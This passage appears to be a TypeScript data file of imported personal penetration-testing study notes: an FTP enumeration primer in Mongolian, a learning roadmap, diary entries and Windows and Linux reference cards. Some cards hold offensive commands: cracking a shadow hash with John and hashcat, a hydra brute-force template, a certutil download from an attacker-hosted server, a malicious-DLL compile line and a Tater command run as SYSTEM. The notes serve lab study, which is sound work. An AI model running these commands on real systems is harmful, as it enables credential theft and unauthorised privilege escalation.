intuition.\n\nStage 3: The Structured Offensive Deep Dive\n\n    Trigger: Activated via TryHackMe 1-2 Month Paid Subscription after Stage 2.\n\n    Curriculum: ==Jr Penetration Tester Path==\n\n            \n    →→\n\n          \n\n    ==Offensive Pentesting Path==.\n\n    Core Focus: Active Directory environments, Kerberos ticket attacks, BloodHound, Buffer Overflows, and Web exploitation chains (SQLi, XSS, SSRF).\n\nStage 4: The Pro Arena & Cloud Exploitation\n\n    Platforms: ==HackTheBox (HTB)==, ==flAWS.cloud / flAWS2.cloud==, and ==PwnedLabs.io==.\n\n    Core Focus: Unguided multi-subnet networks, AWS IAM privilege escalation, S3 bucket takeovers, CloudTrail evasion, and container breakout.\n\nStage 5: Professional Certification & Career Deployment\n\n    Certifications: ==OSCP (Offensive Security Certified Professional)== / ==AWS Certified Security - Specialty==.\n\n    Proof of Work: Public GitHub repository of custom Python exploitation scripts, technical CTF write-ups, and active Bug Bounty hunting on HackerOne/Bugcrowd.\n\n    Endgame: International deployment as an enterprise Cloud Security Engineer.",
    "sourcePath": "useful things/about me.md"
  },
  {
    "id": 10045,
    "title": "FTP",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "4 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/FTP.md",
    "content": "# 📦 FTP SERVER — “ФАЙЛЫН АГУУЛАХЫН ХААЛГА”\n\nЭхлээд:\n\n```\n🚪 Port 21\n   ↓\n📦 FTP service\n   ↓\n📁 Files\n```\n\nFTP-г:\n\n> **“Server-ийн файлын агуулахын хаалга”**\n\nгэж төсөөл.\n\nЧи хаалга `21` дээр очлоо.\n\n---\n\n# 🎬 ACT 1 — FTP яг юу хийдэг вэ?\n\nFTP = **File Transfer Protocol**\n\nТэгэхээр гол ажил нь:\n\n```\n👤 Client\n   │\n   │ FTP\n   ▼\n🏠 FTP Server\n   │\n   ├── 📄 file1\n   ├── 📦 backup.zip\n   └── 📁 uploads\n```\n\nClient server-ээс файл:\n\n```\n⬇️ download\n```\n\nэсвэл server рүү:\n\n```\n⬆️ upload\n```\n\nхийж чадна.\n\nТиймээс FTP харахад хамгийн эхний асуулт:\n\n> **“Энэ server надад яг ямар filesystem access өгч байна?”**\n\n---\n\n# 🧠 ACT 2 — FTP exploitation = “Файл авах” биш\n\nШинэ сурагчид:\n\n> `21 = FTP = exploit`\n\nгэж боддог.\n\nБуруу.\n\nЗөв mental model:\n\n```\n21\n↓\nFTP\n↓\nAuthentication\n↓\nAuthorization\n↓\nFile access\n↓\nConfiguration\n↓\nPossible weakness\n```\n\nТэгэхээр FTP бол зүгээр л **хаалга**.\n\nАюул нь хаалга өөрөө биш.\n\n> **Хаалга хэнийг, хаашаа, ямар эрхтэй оруулж байгаад** байна.\n\n---\n\n# 🔓 ACT 3 — Anonymous Login\n\nFTP-ийн хамгийн алдартай шалгалт:\n\n> **“Надаас жинхэнэ account шаардахгүйгээр оруулах уу?”**\n\nҮүнийг:\n\n# 👤 “Guest key”\n\nгэж төсөөл.\n\nЕрдийн:\n\n```\nYOU\n ↓\n🚪 FTP\n ↓\nUsername?\nPassword?\n ↓\n✅\n```\n\nAnonymous:\n\n```\nYOU\n ↓\n🚪 FTP\n ↓\n\"I'm anonymous.\"\n ↓\n\"Okay.\"\n ↓\n📁 Access\n```\n\nЭнд security question:\n\n> **Anonymous user яг юу хийж чаддаг вэ?**\n\n---\n\n## ⚠️ Anonymous access = automatic vulnerability биш\n\nЭнэ маш чухал.\n\nЖишээ:\n\n```\nAnonymous\n   ↓\n📁 public/\n   ↓\nREAD ONLY\n```\n\nбол application-ийн зорилго байж болно.\n\nХарин:\n\n```\nAnonymous\n   ↓\n📁 sensitive/\n   ↓\nREAD\n```\n\nэсвэл:\n\n```\nAnonymous\n   ↓\n⬆️ WRITE\n```\n\nбол илүү сонирхолтой.\n\nТиймээс:\n\n> **Authentication weakness ≠ immediate compromise**\n\n---\n\n# 📖 ACT 4 — READ vs WRITE\n\nFTP дээр хамгийн чухал хоёр үг:\n\n```\nREAD\nWRITE\n```\n\n### 👀 READ\n\n> “Би file авч чадна.”\n\n```\nSERVER\n  ↓\n📄 secret.txt\n  ↓\n👤 YOU can READ\n```\n\n### ✍️ WRITE\n\n> “Би file байршуулж/өөрчилж чадна.”\n\n```\n👤 YOU\n   ↓\n⬆️ upload\n   ↓\nSERVER\n```\n\nТэгэхээр write permission илүү хүчтэй асуулт үүсгэнэ:\n\n> **“Миний оруулсан файл хаана очдог вэ, түүнийг өөр ямар privileged component ашигладаг вэ?”**\n\n---\n\n# 🧩 ACT 5 — FTP дээр “хамгийн сонирхолтой file” гэж юу вэ?\n\nFTP server дээр:\n\n```\n📄 backup.zip\n📄 config.txt\n📄 users.txt\n📄 old_backup.tar\n📁 uploads/\n📁 public/\n```\n\nгэх мэт зүйл байж болно.\n\nSecurity researcher:\n\n> “File байна”\n\nгээд зогсохгүй.\n\nХарин:\n\n```\nWho owns it?\nWho can read it?\nWho can write it?\nIs it sensitive?\nIs it reused elsewhere?\n```\n\nгэж бодно.\n\n---\n\n# 🕵️ ACT 6 — Backup = TIME CAPSULE\n\nFTP дээр `backup` файлууд их сонирхолтой.\n\nЯагаад?\n\nУчир нь backup бол:\n\n> **“Системийн хуучин үеийн snapshot”**\n\nгэж төсөөлж болно.\n\n```\nNOW\n ↓\n🔐 current config\n\nBACKUP\n ↓\n🗃️ old config\n🗃️ old credentials\n🗃️ old source\n🗃️ old secrets\n```\n\nТиймээс:\n\n> **Backup = өнгөрсөн үеийн мартсан нууц**\n\nгэсэн memory hook ашиглаж болно.\n\nГэхдээ backup-д нууц байгаа нь deterministic биш; шалгаж байж мэднэ.\n\n---\n\n# 🚨 ACT 7 — FTP Service Version\n\nFTP server өөрөө ч software.\n\nЖишээ:\n\n```\nvsftpd\nProFTPD\nPure-FTPd\n...\n```\n\nТиймээс:\n\n```\n🚪 Port 21\n     ↓\n📦 FTP\n     ↓\n⚙️ Which FTP implementation?\n     ↓\n🔢 Which version?\n```\n\nгэдгийг мэдэх хэрэгтэй.\n\nЭнэ нь чиний өмнөх `uname -a` / `os-release` concept-тэй адил.\n\n> **Software + Version = боломжит attack surface**\n\nГэхдээ:\n\n> **“Version хуучин байна” ≠ “заавал exploit болно.”**\n\nPatch/configuration шалгана.\n\n---\n\n# 🧠 ACT 8 — Misconfiguration vs Vulnerability\n\nFTP сурахад энэ ялгааг сайн ойлго.\n\n## Misconfiguration\n\nЖишээ:\n\n```\nAnonymous access\n```\n\nэсвэл:\n\n```\nAnonymous write\n```\n\nбол configuration-ийн асуудал байж болно.\n\n## Software vulnerability\n\nХарин FTP daemon-ийн code дотор:\n\n```\nmemory corruption\nauthentication bypass\ncommand injection\n...\n```\n\nгэх мэт implementation bug байвал vulnerability.\n\nMental map:\n\n```\nFTP\n├── ⚙️ Misconfiguration\n│    ├── anonymous access\n│    ├── weak permissions\n│    └── unsafe sharing\n│\n└── 🐛 Software vulnerability\n     ├── bug\n     ├── memory issue\n     └── auth flaw\n```\n\n---\n\n# 🎬 ACT 9 — FTP-г шалгах логик\n\nЗөвшөөрөлтэй lab дээр чи FTP оллоо гэж бодъё.\n\nMental checklist:\n\n```\n🚪 21 open?\n      ↓\n📦 Which FTP server?\n      ↓\n🔢 Which version?\n      ↓\n👤 Authentication required?\n      ↓\n👤 Anonymous allowed?\n      ↓\n👀 What can anonymous READ?\n      ↓\n✍️ What can anonymous WRITE?\n      ↓\n📁 What directories are exposed?\n      ↓\n🔐 Are there sensitive files?\n      ↓\n⚙️ Is configuration unsafe?\n      ↓\n🐛 Is there a known software vulnerability?\n```\n\nЭнэ бол exploit command цээжлэхээс хавьгүй чухал.\n\n---\n\n# 🧠 FTP-ийн “3 Doors”\n\nFTP-г ингэж санаж болно:\n\n```\n             📦 FTP\n                │\n       ┌────────┼────────┐\n       ↓        ↓        ↓\n    👤 WHO?   👀 WHAT?  ✍️ CAN I CHANGE?\n```\n\n### 👤 WHO?\n\nХэн нэвтэрч чаддаг вэ?\n\n### 👀 WHAT?\n\nЮуг харах/татах боломжтой вэ?\n\n### ✍️ CAN I CHANGE?\n\nЮуг upload/modify хийж болох вэ?\n\n---\n\n# 🧠 “Anonymous FTP”-г бүр амархан санах арга\n\nТөсөөл:\n\n🏢 **File warehouse**\n\nХаалган дээр:\n\n```\nSECURITY:\n\"ID?\"\n\nYOU:\n\"I'm nobody.\"\n\nSECURITY:\n\"Okay, come in.\"\n```\n\n😂\n\nГэхдээ дараагийн асуулт нь хамгийн чухал:\n\n> **“Guest-д агуулахын аль өрөөнүүд нээлттэй вэ?”**\n\n```\nAnonymous\n   ↓\n📦 Public folder       ✅\n📁 Backups             ?\n🔐 Private data        ?\n⬆️ Upload              ?\n```\n\nИнгэж бод.\n\n---\n\n# 🔥 FTP → PRIVESC CONNECTION\n\nFTP өөрөө privilege escalation биш.\n\nХарин заримдаа:\n\n```\nFTP\n ↓\nfile access\n ↓\ninteresting file / credential / write access\n ↓\nanother service trusts that file\n ↓\nnew access\n ↓\npotential privilege escalation\n```\n\nгэж **chain** үүсч болно.\n\nЭнэ бол cybersecurity-ийн маш чухал ойлголт:\n\n> **Нэг weakness ганцаараа root болгох албагүй. Нэг weakness дараагийн хаалгыг нээж болно.**\n\n---\n\n# 🧠 Жишээ Mental Story\n\n```\n🏠 SERVER\n\n🚪 21 FTP\n     ↓\n👤 Anonymous allowed\n     ↓\n📁 backup.zip visible\n     ↓\n🔑 useful credential discovered\n     ↓\n🚪 another service\n     ↓\n👤 authenticated user\n     ↓\n⬆️ privilege escalation\n     ↓\n👑 ROOT\n```\n\nЭнд FTP **эцсийн exploit биш**.\n\nFTP бол:\n\n> **“Эхний clue”**\n\nбайж байна.\n\n---\n\n# 🎯 FTP SUPER MEMORY WALL\n\n```\n🚪 21\n ↓\n📦 FTP\n ↓\n👤 AUTH\n ↓\n👀 READ\n ↓\n✍️ WRITE\n ↓\n📁 FILES\n ↓\n🗃️ BACKUPS\n ↓\n🔢 VERSION\n ↓\n⚙️ CONFIG\n ↓\n🐛 SOFTWARE BUG\n```",
    "sourcePath": "useful things/FTP.md"
  },
  {
    "id": 10046,
    "title": "hash crack",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/hash crack.md",
    "content": "bash\n\n> ```\n> echo'$6$WHmIjebL7MA7KN9A$C4UBJB4WVI37r.Ct3Hbhd3YOcua3AUowO2w2RUNauW8IigHAyVlHzhLrIUxVSGa.twjHc71MoBJfjCTxrkiLR.' > hash.txt\n> \n> Use code with caution.\n> Run John the Ripper using a standard wordlist like rockyou.txt:\n> bash\n> \n> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n> \n> ```\n```\n> hashcat -m 1800 unshadowed.txt rockyou.txt -O\n```\n> ```\n> hashcat -m 1800: Hashcat organizes hashing algorithms by numerical modes. Mode ==1800== represents SHA-512(\n> \n>         \n> pass,pass,\n> \n>       \n> \n> salt) (the standard $6$ Linux crypt algorithm).\n> \n> -O: Enables optimized GPU/CPU kernel routines to maximize cracking speed.\n> ```",
    "sourcePath": "useful things/hash crack.md"
  },
  {
    "id": 10047,
    "title": "hydra poweful and useful some command",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/hydra poweful and useful some command.md",
    "content": " hydra -t 16 -l [USER] -P [WORDLIST] -vV [IP] [PROTOCO\n [[powerful commands]]\n[[Hash-ийг файлд хадгал]]\n\nbash\n\n```bash\necho \"username:*HASHVALUE\" > hash.txt\n```",
    "sourcePath": "useful things/hydra poweful and useful some command.md"
  },
  {
    "id": 10048,
    "title": "learned thing",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/learned thing.md",
    "content": "unuudur google antigravity ashiglaj terminal bolon desktop app suulgalaa, endees nadad hamgiin ih taalagdsan zuil ni terminal deerh feature blaa, uchir ni deerees hoish l terminal ai ashiglaj uzmeer bsn yma, odoonoos new feature turshaj uzii gej bdoj naad zahiin shuud browso holbood ai taiga tsug ashiglah busad ymig odoohondo shaahgvi gej bdoj bn, uchir ni hichneen new tool or new feature turshij uzsen ch nda exprience bolon concepts heregtei gej bdoj ehleed ymuuda hurdan ashiglaj surah heregtei, uneheer taalagdaj bn, odoo aistudiogoogle ashiglaj, tuluvlugu ynz burin nariin ymnuda yarij harin dotorh concepts bur iluu delgerengvi ashiglaj surah heregtei, mun fantasm zuvlusnuur tsaashlad desktop dre hacking tool tati gej bdoj uchir ni hen hende heregtei biz, odoo yu hiih ve gvel linux hiidimu gej bdoj odo new feature heregtei guyu gdg ih sonin, bi ygd enig igt turshij uzegvi ym bolo ene shig gaihaltai tool uud her olon bga bol ghde odoo enig sudalval medeellin tuurugdul oroh biz,\nmun ene surgaltin mun chanar gej yuve, bid buhen l unuudur ymar aztai esvel azgvi niigemd amidarch baigaa medehgvi bn, bidni huvid education bol uneheer muu bgag hun bolgon l medej bga, iimes l buduuleg, mal humuuser duuren bga bh, bi ch gsn ter dundan orj yvjil unheer gutamshigtai yma, uurigu hugjuulj bh heregtei gdge say l mdsn ym shig suuh unheer hetsu ymda, ymig hoishluulahgvi shuud hiij ehli (POINT)",
    "sourcePath": "useful things/learned thing.md"
  },
  {
    "id": 10049,
    "title": "Most important",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/Most important.md",
    "content": "\n\n![[_- visual selection (1).png]]![[_- visual selection.png]]1![[_- visual selection (2).png]]",
    "sourcePath": "useful things/Most important.md"
  },
  {
    "id": 10050,
    "title": "roadmap",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "2 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/roadmap.md",
    "content": "┌─────────────────────────────────────────────────────────────────────────────┐\n│                           PHASE 1: THE FOUNDATION                           │\n│                 [TryHackMe Free Path]  ──>  [OverTheWire]                   │\n└──────────────────────────────────────┬──────────────────────────────────────┘\n                                       │\n                                       ▼\n┌─────────────────────────────────────────────────────────────────────────────┐\n│                     PHASE 2: THE UNGUIDED BAPTISM (CTF)                     │\n│                   [picoCTF]  ──>  [Root-Me]  ──>  [ctf.mn]                  │\n└──────────────────────────────────────┬──────────────────────────────────────┘\n                                       │\n                                       ▼\n┌─────────────────────────────────────────────────────────────────────────────┐\n│                  PHASE 3: THE T-SHAPED SPECIALIZATION                       │\n│  • Web/API Mastery:      PortSwigger Academy                                │\n│  • Cloud Exploitation:   flAWS.cloud & flAWS2.cloud                         │\n│  • Low-Level Internals:  pwn.college                                        │\n│  • DFIR / Forensics:     CyberDefenders                                     │\n│  • Crypto Engineering:   CryptoHack                                         │\n└──────────────────────────────────────┬──────────────────────────────────────┘\n                                       │\n                                       ▼\n┌─────────────────────────────────────────────────────────────────────────────┐\n│                       PHASE 4: THE PRO ARENA & CAREER                       │\n│            [HackTheBox (HTB)]  ──>  [PwnedLabs.io]  ──>  [OSCP]             │\n└─────────────────────────────────────────────────────────────────────────────┘\n\n\n> ==**https://gtfobins.github.io.**==\n\n[Current Position] ──> Finish TryHackMe Active Recon & PrivEsc (Free Path)\n                                      │\n                                      ▼\n[Next Position]    ──> 2 Weeks on CyLab / picoCTF (Unguided Live Fire)\n                                      │\n                                      ▼\n[Paid Tier]        ──> TryHackMe Jr Pentester & Offensive Paths\n                                      │\n                                      ▼\n[Pro League]       ──> HackTheBox & flAWS.cloud",
    "sourcePath": "useful things/roadmap.md"
  },
  {
    "id": 10051,
    "title": "Untitled",
    "room": "useful things",
    "source": "Cyber",
    "stage": "Pro Arena",
    "tags": [
      "ks-import",
      "useful-things",
      "personal-note"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: useful things/Untitled.md",
    "content": "unuu ugluu ih olon ym medej avla, kimi ai gej ymar aimr heregtei ai ve daan ch mash olon hun ashiglaj baina geed alda zagad boldogvie, tgd odoo yruuusu hiih ym bhgvi bn gej bdod bhin bi dotroo odoo tgvel engii ehleed claude project explaination unshad draa ni linux prev 2 task hiigd unuudrin hih yma dusgi tgd dan chuluut tsag shu,\n\n\n\nunuudr ymr yu yu blod ungurvuu, uuriigu ymr muu yg l narig elstei haritsuulsan jishe snaaand orchlo,\njinhen ctf ed nar harsn ted yg yu higd bna, ghdee neg ym mash sain oilgsn chi ene salbaraar yvah ystoi, uurigu haana , ymr hemjeend yvj baigaa baga ch gsn oilgoloo, ene bol tsever mind game hen iluu research tolgoigoo ashiglasan hol yvah amidral, bi iim bjiij uurin hussen ter amidralda myngan jil bolson ch hurehgvi gedeg ni oilgomjtoi, tsalin mungu l bdood bhin bol yaj terige oloh ym be dotorh ter zorilgo negteg, uurin hussen ter gzrta och KSHA,\n",
    "sourcePath": "useful things/Untitled.md"
  },
  {
    "id": 10052,
    "title": "windows",
    "room": "windows fund",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "windows-fund",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: windows fund/windows.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\nTitle: Windows Reconnaissance - Core CLI Binaries (CMD)\nTags: #Windows #CLI #cmd #Reconnaissance #LivingOffTheLand #ipconfig #net\n> ```\n> \n>     Command Help Syntax: ==[command] /?== or ==net help [subcommand]==\n> \n>     Identity & Privileges:\n> \n>         ==whoami== (Current user) / ==whoami /priv== (Active user token privileges).\n> \n>         ==hostname== (Target machine NetBIOS name).\n> \n>     User & Group Enumeration (net.exe):\n> \n>         ==net user== \n>         (List local accounts) / \n>         ==net user [username]== (Detailed account info).\n> \n>         ==net localgroup administrators==\n>          (List local admin group members).\n> \n>         ==net share== \n>         (List active local SMB shares).\n> \n>     Network Interrogation:\n> \n>         ==ipconfig /all==\n>          (Comprehensive network adapter, DNS, and DHCP configuration).\n> ```\n\n> ```\n>         ==netstat -ano==\n>          (All active network sockets mapped to process PIDs).\n> ```",
    "sourcePath": "windows fund/windows.md"
  },
  {
    "id": 10053,
    "title": "TRANSP",
    "room": "windows prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "windows-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: windows prev/TRANSP.md",
    "content": "```\ncertutil -urlcache -f http://192.168.134.205/setup.msi C:\\Temp\\setup.msi\n```\n\n```\n$ python3 -m http.server 80\n\n```\n\n",
    "sourcePath": "windows prev/TRANSP.md"
  },
  {
    "id": 10054,
    "title": "window1",
    "room": "windows prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "windows-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: windows prev/window1.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\n> \n> Title: Windows PrivEsc - Autorun Insecure File Permissions\n> ```\nTags: #Windows #PrivEsc #Autoruns #Sysinternals #DACL #AccessChk #Registry\n> ```\n> \n>     Vulnerability Root: An executable listed in global startup (HKLM\\...\\CurrentVersion\\Run) has insecure DACL permissions allowing standard users to modify/overwrite the file.\n> ```\n> \n    Reconnaissance Workflow:\n\n        Inspect Startup Entries: Run ==Autoruns64.exe==\n\n                \n        →→\n\n              \n\n> ```\n>         Check Logon tab for custom entries.\n> ```\n\n```\n        Audit File Permissions (CLI):\n        accesschk64.exe -wvu \"C:\\Path\\To\\Target\"\n```\n\n> ```\n>         Target Permission to Spot: Everyone: FILE_ALL_ACCESS or BUILTIN\\Users: FILE_WRITE_DATA.\n> ```\n```\n> . Open command prompt and type: C:\\Users\\User\\Desktop\\Tools\\Autoruns\\Autoruns64.exe\n2. In Autoruns, click on the ‘Logon’ tab.\n3. From the listed results, notice that the “My Program” entry is pointing to “C:\\Program Files\\Autorun Program\\program.exe”.\n4. In command prompt type: C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu \"C:\\Program Files\\Autorun Program\"\n5. From the output, notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the “program.exe” file.\n\n\n\n```",
    "sourcePath": "windows prev/window1.md"
  },
  {
    "id": 10055,
    "title": "windows2",
    "room": "windows prev",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "windows-prev",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: windows prev/windows2.md",
    "content": "> ```\n> 1.Open command prompt and type: reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\n> 2.From the output, notice that “AlwaysInstallElevated” value is 1.\n> 3.In command prompt type: reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\n> ```\n\n\nene 2 iig shalgaj boln basic ",
    "sourcePath": "windows prev/windows2.md"
  },
  {
    "id": 10056,
    "title": "windows3",
    "room": "KS",
    "source": "Cyber",
    "stage": "Foundations",
    "tags": [
      "ks-import",
      "field-reference"
    ],
    "status": "Draft",
    "readTime": "1 min",
    "date": "KS import",
    "excerpt": "KS source: windows3.md",
    "content": "📂 STREAMLINED OBSIDIAN VAULT ENTRY\n\nCopy this high-density reference card into your vault:\n\nTitle: Windows PrivEsc - DLL Hijacking, Unquoted Paths & Token Impersonation\nTags: #Windows #PrivEsc #DLLHijacking #UnquotedPaths #Tokens #Potato #SeImpersonate\n\n> ```\n>         unprivileged user drops malicious DLL into writable directory.\n> \n>         Detection: \n>         Procmon.exe filter: Process Name is [service.exe] + Result is NAME NOT FOUND.\n> \n>         C Payload (windows_dll.c): Place administrative command inside DllMain under DLL_PROCESS_ATTACH. Compile with ==x86_64-w64-mingw32-gcc windows_dll.c -shared -o [name].dll==.\n> \n>     2. Unquoted Service Paths:\n> \n>         Mechanism: Unquoted path with spaces causes Windows to attempt executing earlier space-delimited binary substrings (e.g., C:\\Program.exe before C:\\Program Files\\App\\svc.exe).\n> \n>         Audit: ==sc qc [ServiceName]== (Check BINARY_PATH_NAME).\n> \n>         Payload Delivery: Place executable payload named after the intercepted segment in the writable parent folder.\n> \n>     3. Token Impersonation / Potato Attacks (Tater):\n> \n>         Prerequisite: ==whoami /priv== shows ==SeImpersonatePrivilege== or ==SeAssignPrimaryTokenPrivilege==.\n> \n>         Mechanism: Local NTLM reflection/relay via NBNS spoofing and RPC authentication to duplicate and spawn processes under NT AUTHORITY\\SYSTEM.\n> \n>         PowerShell Execution: ==Import-Module .\\Tater.ps1; Invoke-Tater -Trigger 1 -Command \"[CMD]\"==\n> ```",
    "sourcePath": "windows3.md"
  }
] as const;

export const importedKnowledgePlaybooks = [
  {
    "id": "ks-playbook-1",
    "title": "netcat",
    "category": "network",
    "description": "Imported command reference from KS: active recon/netcat.md",
    "methodology": "Source file: active recon/netcat.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source netcat - block 1",
        "cmd": "Modern Alternative: ==ncat== (from Nmap project) supports ==--ssl== for encrypted listeners and banner grabs on TLS ports (Port 443 / 465)."
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-2",
    "title": "traceroute",
    "category": "network",
    "description": "Imported command reference from KS: active recon/traceroute.md",
    "methodology": "Source file: active recon/traceroute.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source traceroute - block 1",
        "cmd": "Mechanism: Exploits the IP header ==TTL (Time To Live)== field. Routers decrement TTL by 1; when TTL=0, the router drops the packet and returns an ==ICMP Type 11 (Time-to-Live Exceeded)== message."
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-3",
    "title": "cheatshit 1",
    "category": "linux",
    "description": "Imported command reference from KS: cheater/cheatshit 1.md",
    "methodology": "Source file: cheater/cheatshit 1.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit 1 - block 1",
        "cmd": "🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE"
      },
      {
        "label": "Source cheatshit 1 - block 2",
        "cmd": "whois target.com | grep -iE \"Registrar:|Name Server:|Creation Date|Expiration Date\""
      },
      {
        "label": "Source cheatshit 1 - block 3",
        "cmd": "curl -s https://rdap.verisign.com/com/v1/domain/target.com | jq ."
      },
      {
        "label": "Source cheatshit 1 - block 4",
        "cmd": "dig @1.1.1.1 target.com [A|AAAA|CNAME|MX|TXT]"
      },
      {
        "label": "Source cheatshit 1 - block 5",
        "cmd": "dig +short target.com [TYPE]"
      },
      {
        "label": "Source cheatshit 1 - block 6",
        "cmd": "https://crt.sh/?q=%.target.com"
      },
      {
        "label": "Source cheatshit 1 - block 7",
        "cmd": "curl -s \"https://crt.sh/?q=%.target.com&output=json\" | jq -r '.[].name_value' | sort -u"
      },
      {
        "label": "Source cheatshit 1 - block 8",
        "cmd": "hostname:\"target.com\"\norg:\"Target Corp\"\nproduct:\"Apache\"\nport:80"
      },
      {
        "label": "Source cheatshit 1 - block 9",
        "cmd": "ping -c 4 [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 1 - block 10",
        "cmd": "≈ 64   → Linux\n≈ 128  → Windows"
      },
      {
        "label": "Source cheatshit 1 - block 11",
        "cmd": "traceroute [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 1 - block 12",
        "cmd": "traceroute -T -p 80 [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 1 - block 13",
        "cmd": "nc [TARGET_IP] [PORT]"
      },
      {
        "label": "Source cheatshit 1 - block 14",
        "cmd": "nc [TARGET_IP] 80"
      },
      {
        "label": "Source cheatshit 1 - block 15",
        "cmd": "GET / HTTP/1.1\nHost: target"
      },
      {
        "label": "Source cheatshit 1 - block 16",
        "cmd": "Double Enter"
      },
      {
        "label": "Source cheatshit 1 - block 17",
        "cmd": "curl -I http://[TARGET_IP]"
      },
      {
        "label": "Source cheatshit 1 - block 18",
        "cmd": "nmap -p- -T4 [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 1 - block 19",
        "cmd": "nmap -sV -sC -Pn -p [PORTS] [TARGET_IP]"
      },
      {
        "label": "Source cheatshit 1 - block 20",
        "cmd": "nmap -sS -p [PORTS] [TARGET_IP]"
      }
    ],
    "tips": [
      "Use only in an authorized lab or on systems you own.",
      "Review target, IP, username, and wordlist placeholders before running.",
      "Record command output back in the related note or report."
    ]
  },
  {
    "id": "ks-playbook-4",
    "title": "cheatshit 2",
    "category": "linux",
    "description": "Imported command reference from KS: cheater/cheatshit 2.md",
    "methodology": "Source file: cheater/cheatshit 2.md\n\nUse commands only in an authorized lab or on systems you own.",
    "commands": [
      {
        "label": "Source cheatshit 2 - block 1",
        "cmd": "🛰️ RECON\n   ↓\n🚪 SERVICES\n   ↓\n🔓 ACCESS\n   ↓\n⬆️ PRIV ESC\n   ↓\n🔬 REVERSE ENGINEERING\n   ↓\n📦 FIRMWARE"
      },
      {
        "label": "Source cheatshit 2 - block 2",
        "cmd": "🏠 SERVER\n              ┌──────────────────┐\n              │                  │\n              │     Linux        │\n              │                  │\n              │  🚪21            │── FTP\n              │  🚪22            │── SSH\n              │  🚪23            │── Telnet\n              │  🚪25            │── SMTP\n              │  🚪445           │── SMB\n              │  🚪2049          │── NFS\n              │  🚪3306          │── MySQL\n              │                  │\n              └──────────────────┘"
      },
      {
        "label": "Source cheatshit 2 - block 3",
        "cmd": "22"
      },
      {
        "label": "Source cheatshit 2 - block 4",
        "cmd": "🚪 Port 22\n   ↓\n⚙️ SSH service"
      },
      {
        "label": "Source cheatshit 2 - block 5",
        "cmd": "21 → FTP"
      },
      {
        "label": "Source cheatshit 2 - block 6",
        "cmd": "📁 files\n📄 documents\n📦 backups"
      },
      {
        "label": "Source cheatshit 2 - block 7",
        "cmd": "anonymous login"
      },
      {
        "label": "Source cheatshit 2 - block 8",
        "cmd": "22 → SSH"
      },
      {
        "label": "Source cheatshit 2 - block 9",
        "cmd": "👤 User\n   ↓\n🚪 22\n   ↓\n🔐 SSH\n   ↓\n💻 Shell"
      },
      {
        "label": "Source cheatshit 2 - block 10",
        "cmd": "private keys\npassword reuse"
      },
      {
        "label": "Source cheatshit 2 - block 11",
        "cmd": "23 → Telnet"
      },
      {
        "label": "Source cheatshit 2 - block 12",
        "cmd": "👤 User\n   ↓\n📞 Telnet\n   ↓\nusername/password\n   ↓\n👀 network дээр ил харагдаж болно"
      },
      {
        "label": "Source cheatshit 2 - block 13",
        "cmd": "cleartext sniffing\nunauthenticated backdoors\nblind RCE"
      },
      {
